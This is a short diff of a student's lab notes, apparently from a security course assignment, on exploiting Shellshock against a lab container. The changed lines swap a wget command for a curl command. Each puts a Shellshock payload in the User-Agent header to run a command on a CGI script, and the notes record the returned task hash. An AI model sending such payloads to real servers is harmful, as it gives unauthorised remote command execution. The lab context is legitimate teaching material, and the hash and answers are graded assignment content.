@@ -6,10 +6,10 @@ run the "ip a" in the VM, then take 172.22.0.1/24, then run the zenmap, enter 17
 
 Task 2:
 run below command in VM terminal:
-wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/task2 mhuang366" http://172.22.0.10:8088/cgi-bin/shellshock.cgi
-the command "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/task2 mhuang366" was ran on the container side, and the result is saved to VM as a file. The file content is:
-Here is your task2 hash:
-f7b6e16c47108233a082db3413960b7b13e35670d658655f6d5bd1c98439e136
+curl -X GET http://172.22.0.10:8088/cgi-bin/shellshock.cgi -H "User-Agent: () { test;};echo; /usr/bin/task2 mhuang366"
+the command was ran on the container side, and returned 
+            Here is your task2 hash:
+            f7b6e16c47108233a082db3413960b7b13e35670d658655f6d5bd1c98439e136
 
 Task 3:
 I use this command to find the location of the files:
